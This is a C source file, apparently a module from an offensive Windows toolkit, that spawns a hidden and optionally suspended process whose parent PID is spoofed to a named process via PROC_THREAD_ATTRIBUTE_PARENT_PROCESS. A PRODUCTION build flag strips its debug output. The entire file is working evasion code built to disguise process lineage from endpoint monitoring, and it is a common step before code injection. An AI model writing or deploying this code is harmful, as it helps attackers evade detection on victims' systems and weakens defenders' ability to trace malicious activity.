/*
 * ppid_spoofing.c
 * Spawn a process with a spoofed parent PID via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
 */

#include "ppid_spoofing.h"
#include "syscalls.h"
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>

DWORD FindProcessByName(const char* processName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    DWORD pid = 0;
    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return pid;
}

BOOL CreateProcessWithSpoofedPPID(
    const char* targetProcess,
    const char* parentProcess,
    BOOL suspended,
    PPPID_SPOOF_RESULT result)
{
    ZeroMemory(result, sizeof(PPID_SPOOF_RESULT));
    lstrcpynA(result->processName, targetProcess, MAX_PATH);
    lstrcpynA(result->parentName, parentProcess, MAX_PATH);

    DWORD parentPid = FindProcessByName(parentProcess);
    if (parentPid == 0) {
#ifndef PRODUCTION
        printf("[-] Parent not found: %s\n", parentProcess);
#endif
        return FALSE;
    }
    result->spoofedParentPid = parentPid;

    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
    if (hParent == NULL) {
#ifndef PRODUCTION
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
#endif
        return FALSE;
    }

    // Build attribute list with spoofed parent
    SIZE_T attributeSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);

    LPPROC_THREAD_ATTRIBUTE_LIST pAttributeList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    if (pAttributeList == NULL) {
        CloseHandle(hParent);
        return FALSE;
    }

    if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &attributeSize)) {
#ifndef PRODUCTION
        printf("[-] InitializeProcThreadAttributeList failed: %lu\n", GetLastError());
#endif
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hParent);
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(
            pAttributeList, 0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParent, sizeof(HANDLE), NULL, NULL))
    {
#ifndef PRODUCTION
        printf("[-] UpdateProcThreadAttribute failed: %lu\n", GetLastError());
#endif
        DeleteProcThreadAttributeList(pAttributeList);
        HeapFree(GetProcessHeap(), 0, pAttributeList);
        CloseHandle(hParent);
        return FALSE;
    }

    STARTUPINFOEXA siex = {0};
    siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    siex.lpAttributeList = pAttributeList;

    PROCESS_INFORMATION pi = {0};
    DWORD creationFlags = EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW;
    if (suspended)
        creationFlags |= CREATE_SUSPENDED;

    BOOL success = CreateProcessA(
        NULL, (LPSTR)targetProcess,
        NULL, NULL, FALSE,
        creationFlags, NULL, NULL,
        &siex.StartupInfo, &pi);

    DeleteProcThreadAttributeList(pAttributeList);
    HeapFree(GetProcessHeap(), 0, pAttributeList);
    CloseHandle(hParent);

    if (!success) {
#ifndef PRODUCTION
        printf("[-] CreateProcessA failed: %lu\n", GetLastError());
#endif
        return FALSE;
    }

    result->success          = TRUE;
    result->processId        = pi.dwProcessId;
    result->threadId         = pi.dwThreadId;
    result->hProcess         = pi.hProcess;
    result->hThread          = pi.hThread;

#ifndef PRODUCTION
    printf("[+] %s spawned (PID:%lu TID:%lu PPID:%lu)\n",
           targetProcess, pi.dwProcessId, pi.dwThreadId, parentPid);
#endif
    return TRUE;
}

VOID PrintPPIDSpoofResult(PPPID_SPOOF_RESULT result)
{
#ifndef PRODUCTION
    printf("[%s] PPID spoof — process:%s PID:%lu parent:%s PPID:%lu\n",
           result->success ? "+" : "-",
           result->processName, result->processId,
           result->parentName,  result->spoofedParentPid);
#endif
}

